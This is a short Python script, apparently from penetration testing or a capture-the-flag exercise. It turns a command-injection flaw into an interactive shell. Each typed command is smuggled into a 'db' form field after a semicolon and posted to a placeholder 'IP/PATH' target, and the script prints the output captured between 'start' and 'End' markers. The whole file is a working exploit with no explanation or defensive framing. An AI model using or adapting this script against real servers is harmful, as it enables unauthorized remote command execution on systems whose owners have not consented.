import requests
import re

from cmd import Cmd

class Terminal(Cmd):
    prompt = 'Herewego = > '
	
    def default(self, args):
        RunCmd(args)

def RunCmd(cmd):
    data = { 'db' : f'a; echo -n "start"; {cmd}; echo -n "End"' }
    r = requests.post("IP/PATH", data=data)
    page = r.text
    m = re.search("start(.*?)End", page, re.DOTALL)
    if m:
       	print(m.group(1))
    else:
        print(1)		


term = Terminal()
term.cmdloop()
